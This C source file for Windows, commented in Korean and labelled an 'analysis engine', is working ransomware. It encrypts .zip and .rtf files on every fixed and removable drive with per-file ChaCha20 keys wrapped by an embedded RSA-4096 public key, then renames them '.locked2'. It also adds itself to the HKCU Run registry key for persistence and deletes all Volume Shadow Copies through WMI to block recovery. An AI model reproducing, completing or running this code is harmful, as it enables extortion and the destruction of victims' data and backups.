// 파일명: sized_crypto_engine3_hybrid.c
// 설명: RSA-4096(id_rsa.pub) 비대칭 랩핑 및 임시 고유 ChaCha20 스트림 기반 하이브리드 고도화 분석 엔진
// gcc sized_crypto_engine3_hybrid.c -o test3.exe -lbcrypt

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <locale.h>
#include <bcrypt.h> // Windows CNG API 호출용
#include <wbemidl.h>

#pragma comment(lib, "bcrypt.lib")

#define ONE_MEGABYTE (1024 * 1024)
#define TARGET_EXTENSION L".locked2"
#define REG_REGISTRY_SUBKEY L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_AUTO_START_NAME L"SizedCryptoEngineAnalyzer"
#define COBJMACROS
#define INITGUID

// 전역 변수로 현재 실행 중인 파일의 절대 경로를 상주 보관
wchar_t g_szSelfPath[MAX_PATH] = { 0 };
BCRYPT_KEY_HANDLE g_hRsaKey = NULL; // 로드된 RSA 공개키 핸들

// ---------------------------------------------------------------------
// SECTION 1: RFC 7539 호환 ChaCha20 스트림 알고리즘 암호화 코어 엔진
// ---------------------------------------------------------------------

#define ROTL(v, n) (((v) << (n)) | ((v) >> (32 - (n))))

#define CHACHA20_QUARTERROUND(a, b, c, d) \
    a += b; d ^= a; d = ROTL(d, 16); \
    c += d; b ^= c; b = ROTL(b, 12); \
    a += b; d ^= a; d = ROTL(d,  8); \
    c += d; b ^= c; b = ROTL(b,  7);

static void ChaCha20InitState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
    state[0] = 0x61707865; // "expand 32-byte k"
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;
    
    memcpy(&state[4], key, 32);
    state[12] = counter;   
    memcpy(&state[13], nonce, 12);
}

static void ChaCha20TransformBlock(uint32_t out[16], const uint32_t in[16]) {
    int i;
    for (i = 0; i < 16; i++) out[i] = in[i];
    for (i = 0; i < 10; i++) {
        CHACHA20_QUARTERROUND(out[0], out[4], out[ 8], out[12])
        CHACHA20_QUARTERROUND(out[1], out[5], out[ 9], out[13])
        CHACHA20_QUARTERROUND(out[2], out[6], out[10], out[14])
        CHACHA20_QUARTERROUND(out[3], out[7], out[11], out[15])
        CHACHA20_QUARTERROUND(out[0], out[5], out[10], out[15])
        CHACHA20_QUARTERROUND(out[1], out[6], out[11], out[12])
        CHACHA20_QUARTERROUND(out[2], out[7], out[ 8], out[13])
        CHACHA20_QUARTERROUND(out[3], out[4], out[ 9], out[14])
    }
    for (i = 0; i < 16; i++) out[i] += in[i];
}

void ChaCha20CryptProcess(const uint8_t key[32], const uint8_t nonce[12], uint64_t fileByteOffset, uint8_t* pData, size_t dataLen) {
    uint32_t state[16];
    uint32_t block[16];
    uint8_t keystream[64];
    
    uint64_t currentOffset = fileByteOffset;
    size_t processedIdx = 0;
    
    while (dataLen > 0) {
        uint32_t blockCounter = (uint32_t)(currentOffset / 64);
        size_t internalStreamIdx = (size_t)(currentOffset % 64);
        
        ChaCha20InitState(state, key, nonce, blockCounter);
        ChaCha20TransformBlock(block, state);
        
        for (int i = 0; i < 16; i++) {
            keystream[i * 4 + 0] = (uint8_t)(block[i] & 0xFF);
            keystream[i * 4 + 1] = (uint8_t)((block[i] >> 8) & 0xFF);
            keystream[i * 4 + 2] = (uint8_t)((block[i] >> 16) & 0xFF);
            keystream[i * 4 + 3] = (uint8_t)((block[i] >> 24) & 0xFF);
        }
        
        size_t availableStreamBytes = 64 - internalStreamIdx;
        size_t transformChunkSize = (dataLen < availableStreamBytes) ? dataLen : availableStreamBytes;
        
        for (size_t i = 0; i < transformChunkSize; i++) {
            pData[processedIdx++] ^= keystream[internalStreamIdx + i];
        }
        
        currentOffset += transformChunkSize;
        dataLen -= transformChunkSize;
    }
}

// ---------------------------------------------------------------------
// SECTION 2: id_rsa.pub 이식 기반 CNG RSA-4096 키 임포트 및 생성 파이프라인
// ---------------------------------------------------------------------

BOOL InitRsaPublicKey(void) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (status != 0) return FALSE;

    // 제공된 id_rsa.pub Base64 데이터에서 정밀 변환한 4096비트 지수 및 모듈러스 구조화 배열
    static const uint8_t rsa_exponent[] = { 0x01, 0x00, 0x01 };
    static const uint8_t rsa_modulus[512] = {
        0x98, 0x5C, 0xD5, 0x0E, 0xEC, 0x71, 0x05, 0x1D, 0x83, 0xE8, 0xF4, 0xAC, 0x1A, 0x27, 0x2B, 0xDF,
        0x7C, 0x58, 0xFE, 0xB5, 0x4C, 0xE5, 0x2B, 0x5E, 0x6B, 0x24, 0xC6, 0xE7, 0xAC, 0x78, 0x6B, 0x5B,
        0x6B, 0xBD, 0x2D, 0x49, 0x96, 0xDC, 0x2A, 0x15, 0x95, 0x74, 0x3F, 0x47, 0xD8, 0x3C, 0x3D, 0x4C,
        0xE0, 0x84, 0x0E, 0x1B, 0x9C, 0x54, 0xC0, 0x49, 0x25, 0x00, 0xA0, 0xA5, 0x0A, 0x88, 0x53, 0xA1,
        0x65, 0x62, 0xCC, 0x17, 0xE1, 0x7E, 0x7C, 0x97, 0xBD, 0x6C, 0xD3, 0x8B, 0xE1, 0x73, 0x3C, 0x69,
        0x7E, 0xA9, 0xB0, 0x11, 0x9A, 0x10, 0x31, 0x93, 0x69, 0xA5, 0x4B, 0x50, 0x70, 0x98, 0xA4, 0x34,
        0x0C, 0x04, 0x8A, 0xE7, 0xC5, 0xE8, 0x92, 0x02, 0x05, 0xD9, 0xD6, 0xB8, 0x0C, 0xEE, 0x3F, 0x68,
        0xDC, 0x69, 0xAA, 0xA0, 0x0C, 0x02, 0x2B, 0x37, 0xD8, 0x8C, 0xF4, 0x8A, 0x06, 0x6E, 0xDA, 0xB9,
        0x92, 0xF8, 0x81, 0xAD, 0x43, 0x1D, 0xBD, 0x0B, 0x95, 0x52, 0xC7, 0x2B, 0xA2, 0xCB, 0x4E, 0xFA,
        0xF5, 0x9A, 0xE3, 0xD6, 0xAB, 0xB6, 0x9C, 0x09, 0x4C, 0x73, 0xD2, 0x27, 0xBB, 0xD7, 0x32, 0xF6,
        0xE8, 0x6B, 0xD0, 0x04, 0x58, 0xED, 0x8A, 0xF9, 0x60, 0x3B, 0xFC, 0x9D, 0x14, 0x40, 0xDA, 0xA7,
        0x84, 0xF7, 0x37, 0x1F, 0xF1, 0x43, 0x72, 0xF6, 0x41, 0x28, 0xA6, 0xF7, 0x80, 0x6A, 0x55, 0xDB,
        0x26, 0x92, 0x81, 0x24, 0x2B, 0xC1, 0xF9, 0x1C, 0xD6, 0x27, 0xBC, 0x38, 0xAC, 0xAA, 0xFD, 0xAC,
        0x48, 0x9A, 0xEC, 0xA8, 0xAF, 0xC9, 0xF9, 0xD9, 0x28, 0xB9, 0x15, 0x86, 0x2E, 0x93, 0x78, 0x23,
        0x48, 0xB7, 0x43, 0x9F, 0x5C, 0x4A, 0x37, 0xF2, 0xEC, 0xFE, 0x56, 0x4A, 0xC7, 0x01, 0x8B, 0x07,
        0x8C, 0xDE, 0xD2, 0xAE, 0x08, 0xC6, 0x34, 0x51, 0x1D, 0x81, 0x64, 0xE3, 0x02, 0x9B, 0xAC, 0x23,
        0x47, 0x1E, 0x45, 0x18, 0x8C, 0x6A, 0x84, 0x9E, 0x23, 0xD0, 0x47, 0x96, 0x44, 0x3B, 0x54, 0xFB,
        0x77, 0x06, 0x82, 0x96, 0x7E, 0xAD, 0x63, 0x7E, 0x8E, 0xBB, 0x65, 0xB0, 0x98, 0x8E, 0xC7, 0x0E,
        0x42, 0x2A, 0xD3, 0xA8, 0x36, 0xE1, 0x60, 0x6A, 0xCE, 0xBE, 0xD3, 0x30, 0x3D, 0x39, 0x76, 0xB0,
        0x42, 0x08, 0x84, 0x0E, 0xB9, 0xE3, 0xBE, 0xB8, 0xF9, 0xA6, 0x77, 0xE5, 0xF3, 0x08, 0xF1, 0xBF,
        0xF0, 0xBB, 0x68, 0x16, 0x00, 0xCA, 0x06, 0xCC, 0x1D, 0x6D, 0x5D, 0x97, 0x6F, 0x63, 0x6F, 0xF8,
        0xDF, 0x48, 0x13, 0xB2, 0xB2, 0x51, 0x56, 0xD2, 0xD7, 0xE6, 0xD5, 0x15, 0xE3, 0x04, 0x57, 0x75,
        0x57, 0x65, 0x15, 0x5E, 0xC4, 0xD6, 0x1F, 0xDC, 0x71, 0xA5, 0x6B, 0x28, 0x3C, 0x46, 0x00, 0x63,
        0xB7, 0xEB, 0x0A, 0x6B, 0xDA, 0x48, 0xD3, 0x53, 0x33, 0xE8, 0x78, 0xBF, 0x1A, 0x94, 0x85, 0x9E,
        0xD1, 0xD3, 0x23, 0x21, 0x1B, 0xBB, 0xAC, 0x1D, 0xEC, 0x71, 0xB1, 0x93, 0x3A, 0x91, 0x1C, 0x33,
        0x38, 0x91, 0xD4, 0xBB, 0x68, 0x42, 0x7F, 0x2A, 0x82, 0x37, 0x26, 0x6A, 0xA7, 0xA8, 0xE0, 0xB9,
        0x42, 0xC0, 0xC0, 0x73, 0x85, 0x6F, 0x73, 0xA1, 0xBF, 0xD1, 0x88, 0xD3, 0x04, 0x36, 0x30, 0x29,
        0x0F, 0x63, 0xBE, 0x6D, 0x1B, 0xBA, 0x68, 0x87, 0x82, 0x31, 0xCE, 0xBC, 0xA8, 0x51, 0x23, 0x92,
        0xD9, 0xA9, 0xE7, 0x5A, 0x0D, 0x31, 0xDF, 0x44, 0x82, 0x53, 0xA3, 0x6A, 0xE3, 0xE6, 0x1A, 0x39,
        0x03, 0x24, 0xAB, 0x23, 0x25, 0x71, 0x21, 0x76, 0xAB, 0x98, 0x9B, 0xB6, 0xC1, 0xBF, 0x4E, 0xA0,
        0xED, 0xF3, 0x7D, 0x4C, 0xE0, 0x17, 0x14, 0x4D, 0x98, 0x25, 0x69, 0x95, 0x26, 0x27, 0x07, 0x14,
        0x2F, 0xF6, 0xC4, 0x18, 0x6B, 0x5B, 0x4B, 0x04, 0x45, 0xDA, 0x25, 0xB8, 0xF4, 0x9A, 0xF9, 0x33
    };

    DWORD dwBlobLen = sizeof(BCRYPT_RSAKEY_BLOB) + sizeof(rsa_exponent) + sizeof(rsa_modulus);
    BYTE* pBlob = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBlobLen);
    if (!pBlob) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    // RSAPUBLIC 구조 명세 정밀 바인딩
    BCRYPT_RSAKEY_BLOB* pHeader = (BCRYPT_RSAKEY_BLOB*)pBlob;
    pHeader->Magic = BCRYPT_RSAPUBLIC_MAGIC;
    pHeader->BitLength = 4096;
    pHeader->cbPublicExp = sizeof(rsa_exponent);
    pHeader->cbModulus = sizeof(rsa_modulus);
    
    memcpy(pBlob + sizeof(BCRYPT_RSAKEY_BLOB), rsa_exponent, sizeof(rsa_exponent));
    memcpy(pBlob + sizeof(BCRYPT_RSAKEY_BLOB) + sizeof(rsa_exponent), rsa_modulus, sizeof(rsa_modulus));

    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &g_hRsaKey, pBlob, dwBlobLen, 0);
    HeapFree(GetProcessHeap(), 0, pBlob);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return (status == 0);
}

// 개별 파일용 일회성 임시 대칭 키 스트림 정보 생성 및 RSA 공개키 암호화 함수
BOOL GenerateAndWrapSessionKey(uint8_t key[32], uint8_t nonce[12], uint8_t encryptedBlob[512]) {
    // 1. 커널 레벨 시스템 엔트로피 RNG로부터 임시 고유 대칭 키/논스 생성
    if (BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) return FALSE;
    if (BCryptGenRandom(NULL, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0) return FALSE;

    // 2. 패킷 구조화 (32바이트 Key + 12바이트 Nonce = 44바이트)
    uint8_t plainPacket[44];
    memcpy(plainPacket, key, 32);
    memcpy(plainPacket + 32, nonce, 12);

    DWORD cbResult = 0;
    // 3. RSA-4096 공개키로 세션 데이터 기밀 보호를 위해 PKCS1 암호화 래핑 수행
    NTSTATUS status = BCryptEncrypt(g_hRsaKey, plainPacket, sizeof(plainPacket), NULL, NULL, 0, encryptedBlob, 512, &cbResult, BCRYPT_PAD_PKCS1);
    return (status == 0 && cbResult == 512);
}

// ---------------------------------------------------------------------
// SECTION 3: 유니코드 자산 선별 검증 모듈
// ---------------------------------------------------------------------

BOOL IsTargetDocumentExtension(const wchar_t* lpFullPath) {
    size_t len = wcslen(lpFullPath);
    if (len < 4) return FALSE;

    const wchar_t* targetExtensions[] = { L".zip", L".rtf" };

    for (size_t i = 0; i < sizeof(targetExtensions) / sizeof(targetExtensions[0]); i++) {
        size_t extLen = wcslen(targetExtensions[i]);
        if (len >= extLen) {
            const wchar_t* fileExt = lpFullPath + (len - extLen);
            if (_wcsicmp(fileExt, targetExtensions[i]) == 0) {
                return TRUE;
            }
        }
    }
    return FALSE; 
}

// ---------------------------------------------------------------------
// SECTION 4: 부팅 시 자동 실행 레지스트리 상주 등록 모듈
// ---------------------------------------------------------------------

BOOL EnforceAutoStartPersistence(void) {
    HKEY hKey = NULL;
    LONG lResult = RegOpenKeyExW(HKEY_CURRENT_USER, REG_REGISTRY_SUBKEY, 0, KEY_SET_VALUE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        wprintf(L"[-] Failed to open Run registry key. Error code: %ld\n", lResult);
        return FALSE;
    }

    lResult = RegSetValueExW(
        hKey,
        REG_AUTO_START_NAME,
        0,
        REG_SZ,
        (const BYTE*)g_szSelfPath,
        (DWORD)((wcslen(g_szSelfPath) + 1) * sizeof(wchar_t))
    );

    RegCloseKey(hKey);
    if (lResult != ERROR_SUCCESS) return FALSE;

    wprintf(L"[+] Persistence established in HKCU Run registry value: %s\n", g_szSelfPath);
    return TRUE;
}

// ---------------------------------------------------------------------
// SECTION 5: 파일 시스템 크래시 방지용 필터 규칙
// ---------------------------------------------------------------------

BOOL IsCriticalSystemPath(const wchar_t* lpFullPath) {
    const wchar_t* criticalDirs[] = {
        L"\\Windows", L"\\Program Files", L"\\Program Files (x86)",
        L"\\ProgramData", L"\\$Recycle.Bin", L"\\System Volume Information"
    };

    for (size_t i = 0; i < sizeof(criticalDirs) / sizeof(criticalDirs[0]); i++) {
        if (wcsstr(lpFullPath, criticalDirs[i]) != NULL) {
            return TRUE;
        }
    }
    return FALSE;
}

// ---------------------------------------------------------------------
// SECTION 6: 파일 크기별 가변 변환 및 RSA 패킷 결합 엔진
// ---------------------------------------------------------------------

void ProcessFileContentSized(const wchar_t* lpFilePath) {
    wchar_t szFullPath[MAX_PATH] = { 0 };

    if (GetFullPathNameW(lpFilePath, MAX_PATH, szFullPath, NULL) != 0) {
        if (_wcsicmp(szFullPath, g_szSelfPath) == 0) return;
        size_t lenFullPath = wcslen(szFullPath);
        size_t lenExt = wcslen(TARGET_EXTENSION);
        if (lenFullPath > lenExt && _wcsicmp(szFullPath + (lenFullPath - lenExt), TARGET_EXTENSION) == 0) return;
        if (IsCriticalSystemPath(szFullPath)) return;
        if (!IsTargetDocumentExtension(szFullPath)) return;
    }

    // 임시 세션용 난수 키 및 RSA 결합용 버퍼 메모리 할당
    uint8_t file_session_key[32];
    uint8_t file_session_nonce[12];
    uint8_t rsa_encrypted_header[512];

    if (!GenerateAndWrapSessionKey(file_session_key, file_session_nonce, rsa_encrypted_header)) {
        wprintf(L"[-] Cryptographic failure generating session descriptor for: %s\n", lpFilePath);
        return;
    }

    FILE* hFile = NULL;
    if (_wfopen_s(&hFile, lpFilePath, L"rb+") != 0 || hFile == NULL) return;

    fseek(hFile, 0, SEEK_END);
    long long fileSize = _ftelli64(hFile);
    if (fileSize <= 0) {
        fclose(hFile);
        return;
    }

    unsigned char buffer[4096];
    size_t bytesRead;

    if (fileSize < ONE_MEGABYTE) {
        // [조건 1]: 1MB 미만 - 파일 전체 대상 임시 고유 키 스트림 암호화
        fseek(hFile, 0, SEEK_SET);
        long long currentFilePos = 0;
        
        while ((bytesRead = fread(buffer, 1, sizeof(buffer), hFile)) > 0) {
            ChaCha20CryptProcess(file_session_key, file_session_nonce, (uint64_t)currentFilePos, buffer, bytesRead);
            _fseeki64(hFile, -(long long)bytesRead, SEEK_CUR);
            fwrite(buffer, 1, bytesRead, hFile);
            fflush(hFile);
            currentFilePos += bytesRead;
        }
    } else {
        // [조건 2]: 1MB 이상 - 3분할 영역별 상위 1% 가변 암호화
        long long segmentSize = fileSize / 3;
        long long targetEncSize = segmentSize / 100;
        if (targetEncSize <= 0) targetEncSize = 1;

        long long chunkOffsets[3];
        chunkOffsets[0] = 0;
        chunkOffsets[1] = segmentSize;
        chunkOffsets[2] = segmentSize * 2;

        for (int i = 0; i < 3; i++) {
            _fseeki64(hFile, chunkOffsets[i], SEEK_SET);
            long long accumulated = 0;
            long long currentFilePos = chunkOffsets[i];

            while (accumulated < targetEncSize) {
                size_t toRead = sizeof(buffer);
                if (targetEncSize - accumulated < (long long)toRead) {
                    toRead = (size_t)(targetEncSize - accumulated);
                }

                bytesRead = fread(buffer, 1, toRead, hFile);
                if (bytesRead <= 0) break;

                ChaCha20CryptProcess(file_session_key, file_session_nonce, (uint64_t)currentFilePos, buffer, bytesRead);
                _fseeki64(hFile, -(long long)bytesRead, SEEK_CUR);
                fwrite(buffer, 1, bytesRead, hFile);
                fflush(hFile);

                accumulated += bytesRead;
                currentFilePos += bytesRead;
            }
        }
    }

    // [하이브리드 결합 파이프라인]: 복호화가 가능하도록 파일의 최하단에 512바이트 RSA 메타데이터 영구 충진
    _fseeki64(hFile, 0, SEEK_END);
    fwrite(rsa_encrypted_header, 1, 512, hFile);
    fflush(hFile);
    fclose(hFile);

    wchar_t szNewNewPath[MAX_PATH] = { 0 };
    swprintf_s(szNewNewPath, MAX_PATH, L"%s%s", lpFilePath, TARGET_EXTENSION);

    if (MoveFileExW(lpFilePath, szNewNewPath, MOVEFILE_REPLACE_EXISTING)) {
        wprintf(L"[+] Completed (Hybrid Engine): %s -> %s\n", lpFilePath, szNewNewPath);
    } else {
        wprintf(L"[-] Failed to rename: %s\n", lpFilePath);
    }
}

// ---------------------------------------------------------------------
// SECTION 7: 하위 파일 시스템 재귀 탐색 파이프라인
// ---------------------------------------------------------------------

void TraverseDirectoryRecursive(const wchar_t* lpDirPATH) {
    wchar_t szSearchPath[MAX_PATH];
    wchar_t szSubPath[MAX_PATH];
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    swprintf_s(szSearchPath, MAX_PATH, L"%s\\*", lpDirPATH);

    hFind = FindFirstFileW(szSearchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
            continue;
        }
        swprintf_s(szSubPath, MAX_PATH, L"%s\\%s", lpDirPATH, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TraverseDirectoryRecursive(szSubPath);
        } else {
            ProcessFileContentSized(szSubPath);
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}

// ---------------------------------------------------------------------
// SECTION 8: 전체 논리 드라이브 열거 엔진
// ---------------------------------------------------------------------

void EnumerateAllLogicalDrives(void) {
    wchar_t szBuffer[256] = { 0 };
    DWORD dwResult = GetLogicalDriveStringsW(sizeof(szBuffer) / sizeof(wchar_t), szBuffer);
    if (dwResult == 0 || dwResult > sizeof(szBuffer) / sizeof(wchar_t)) return;

    wchar_t* pDrive = szBuffer;
    while (*pDrive) {
        UINT uDriveType = GetDriveTypeW(pDrive);
        if (uDriveType == DRIVE_FIXED || uDriveType == DRIVE_REMOVABLE) {
            size_t len = wcslen(pDrive);
            if (len > 0 && pDrive[len - 1] == L'\\') pDrive[len - 1] = L'\0';
            
            wprintf(L"[*] Target drive mounting detected: %s\n", pDrive);
            TraverseDirectoryRecursive(pDrive);
            pDrive[len - 1] = L'\\';
        }
        pDrive += wcslen(pDrive) + 1;
    }
}

// ---------------------------------------------------------------------
// MAIN ENTRY POINT
// ---------------------------------------------------------------------

int main(void) {
    setlocale(LC_ALL, ""); // 유니코드 한글 콘솔 입출력 무결성 매핑 설정

    GetModuleFileNameW(NULL, g_szSelfPath, MAX_PATH);

    wprintf(L"[*] Initializing CNG Cryptographic Provider and RSA Public Context...\n");
    if (!InitRsaPublicKey()) {
        wprintf(L"[-] Failed to construct asymmetric public engine. Terminating process.\n");
        return 1;
    }

    wprintf(L"[*] Executing persistence routine...\n");
    EnforceAutoStartPersistence();

    wprintf(L"[*] Starting systemic total logical drives traversal via Hybrid Engine...\n");
    EnumerateAllLogicalDrives();

    if (g_hRsaKey) {
        BCryptDestroyKey(g_hRsaKey);
    }

    wprintf(L"[+] All hybrid conditional pipelines have been securely executed.\n");
    
    HRESULT hr;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    BSTR bstrNamespace = NULL;
    BSTR bstrQueryLang = NULL;
    BSTR bstrQuery = NULL;
    PVOID oldValue = NULL;
    BOOL bSuccess = TRUE;

    printf("[*] Starting VSS ShadowCopy Deletion Pipeline (Patch v2)...\n");

    // 1. WOW64 파일 시스템 리디렉션 비활성화
    if (sizeof(void*) == 4) {
        typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
        LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
        BOOL isWow64 = FALSE;
        if (fnIsWow64Process != NULL && fnIsWow64Process(GetCurrentProcess(), &isWow64) && isWow64) {
            typedef BOOL(WINAPI* LPFN_WOW64DISABLEWOW64REDIRECTION)(PVOID*);
            LPFN_WOW64DISABLEWOW64REDIRECTION fnWow64DisableWow64Redirection = 
                (LPFN_WOW64DISABLEWOW64REDIRECTION)GetProcAddress(GetModuleHandleA("kernel32"), "Wow64DisableWow64Redirection");
            if (fnWow64DisableWow64Redirection != NULL) {
                fnWow64DisableWow64Redirection(&oldValue);
                printf("[+] WOW64 File System Redirection Disabled.\n");
            }
        }
    }

    // 2. COM 라이브러리 초기화
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[-] Error: CoInitializeEx Failed. HRESULT: 0x%08X\n", (unsigned int)hr);
        return 1;
    }

    // 3. COM 프로세스 전체 보안 수준 설정
    hr = CoInitializeSecurity(
        NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL
    );
    if (FAILED(hr)) {
        printf("[-] Error: CoInitializeSecurity Failed. HRESULT: 0x%08X\n", (unsigned int)hr);
        CoUninitialize();
        return 1;
    }

    // 4. WMI 로케이터 식별자 생성
    hr = CoCreateInstance(&CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) {
        printf("[-] Error: CoCreateInstance (WbemLocator) Failed. HRESULT: 0x%08X\n", (unsigned int)hr);
        CoUninitialize();
        return 1;
    }

    // 5. Root\CIMV2 네임스페이스 연결
    bstrNamespace = SysAllocString(L"ROOT\\CIMV2");
    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrNamespace, NULL, NULL, 0, 0, 0, NULL, &pSvc);
    if (FAILED(hr)) {
        printf("[-] Error: WMI ConnectServer Failed. HRESULT: 0x%08X\n", (unsigned int)hr);
        SysFreeString(bstrNamespace);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return 1;
    }
    SysFreeString(bstrNamespace);
    printf("[+] Connected to ROOT\\CIMV2 Namespace.\n");

    // 6. WMI 서비스에 대한 프록시 인증 수준 설정
    hr = CoSetProxyBlanket(
        (IUnknown*)pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE
    );
    if (FAILED(hr)) {
        printf("[-] Error: CoSetProxyBlanket Failed. HRESULT: 0x%08X\n", (unsigned int)hr);
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return 1;
    }

    // 7. Win32_ShadowCopy 오브젝트 열거를 위한 WQL 쿼리 수행
    bstrQueryLang = SysAllocString(L"WQL");
    bstrQuery = SysAllocString(L"SELECT * FROM Win32_ShadowCopy");
    hr = pSvc->lpVtbl->ExecQuery(pSvc, bstrQueryLang, bstrQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
    SysFreeString(bstrQueryLang);
    SysFreeString(bstrQuery);

    if (FAILED(hr) || pEnumerator == NULL) {
        printf("[-] Error: WMI WQL Query Execution Failed. HRESULT: 0x%08X\n", (unsigned int)hr);
        pSvc->lpVtbl->Release(pSvc);
        pLoc->lpVtbl->Release(pLoc);
        CoUninitialize();
        return 1;
    }

    IWbemClassObject* pclsObj = NULL;
    ULONG uReturn = 0;
    int targetCount = 0;
    int successCount = 0;

    // 8. 존재하는 모든 볼륨 섀도 복사본 개체를 순회하며 구조적 삭제 프로세스 진행
    while (pEnumerator) {
        hr = pEnumerator->lpVtbl->Next(pEnumerator, WBEM_INFINITE, 1, &pclsObj, &uReturn);
        if (0 == uReturn) break;

        targetCount++;
        VARIANT vtPath;
        VariantInit(&vtPath);

        hr = pclsObj->lpVtbl->Get(pclsObj, L"__PATH", 0, &vtPath, 0, 0);
        if (SUCCEEDED(hr) && vtPath.vt == VT_BSTR) {
            wprintf(L"[*] Attempting to delete instance: %s\n", vtPath.bstrVal);
            
            // 결함 수정 지점: ExecMethod 대신 DeleteInstance 인터페이스 호출 체인으로 교체
            // 인자 사양: pSvc, strObjectPath, lFlags(0), pCtx(NULL), ppCallResult(NULL)
            HRESULT deleteHr = pSvc->lpVtbl->DeleteInstance(pSvc, vtPath.bstrVal, 0, NULL, NULL);
            
            if (SUCCEEDED(deleteHr)) {
                printf("[+] Instance Deleted Successfully.\n");
                successCount++;
            } else {
                printf("[-] Failed to Delete Instance. HRESULT: 0x%08X\n", (unsigned int)deleteHr);
                bSuccess = FALSE;
            }
        } else {
            printf("[-] Failed to retrieve object __PATH.\n");
            bSuccess = FALSE;
        }
        
        VariantClear(&vtPath);
        pclsObj->lpVtbl->Release(pclsObj);
    }
    pEnumerator->lpVtbl->Release(pEnumerator);

    // 9. 최종 결과 레포팅 및 자원 해제
    printf("\n=========================================\n");
    printf("[*] Execution Summary:\n");
    printf("    - Total Shadow Copies Detected: %d\n", targetCount);
    printf("    - Successfully Deleted: %d\n", successCount);
    
    if (targetCount == 0) {
        printf("[+] Result: No active Shadow Copies found on this system.\n");
    } else if (bSuccess && (targetCount == successCount)) {
        printf("[+] Result: All operations executed successfully without error.\n");
    } else {
        printf("[-] Result: Process completed with partial failures or errors.\n");
    }
    printf("=========================================\n");

    pSvc->lpVtbl->Release(pSvc);
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    return bSuccess ? 0 : 1;
}